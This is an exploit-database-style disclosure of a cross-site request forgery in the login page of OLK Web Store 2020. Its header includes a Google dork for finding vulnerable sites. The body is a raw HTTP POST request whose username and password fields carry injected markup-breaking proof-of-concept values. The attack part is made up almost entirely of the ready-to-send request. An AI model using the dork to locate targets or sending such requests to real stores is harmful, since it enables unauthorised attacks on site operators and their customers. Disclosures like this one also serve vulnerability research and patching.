@@ -1,0 +1,27 @@
+# Exploit Title: OLK Web Store 2020 - Cross-Site Request Forgery
+# Google Dork: intext:"TopManage ® 2002 - 2020"
+# Date: 2020-01-13
+# Exploit Author: Joel Aviad Ossi
+# Vendor Homepage: http://www.topmanage.com/
+# Software Link: http://www.topmanage.com/microsites/olk-web-store/
+# Version: 2020
+# Tested on: N/A
+# CVE : N/A
+
+# Reference: https://websec.nl/news.php 
+
+POST /olk/client/login.asp HTTP/1.1
+Host: examplesite.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 88
+Origin: https://examplesite.com
+Connection: close
+Referer: https://examplesite.com/olk/client/login.asp?se=Y
+Cookie: myLng=en; ASPSESSIONIDCGARQSCD=JGFFLBIAAKGBKANKLAPHMEDH
+Upgrade-Insecure-Requests: 1
+
+dbID=0&UserName=%22%3EPOC&Password=%22%3ECSRF&newLng=en&btnEnter=Enter&sHeight=400&other=
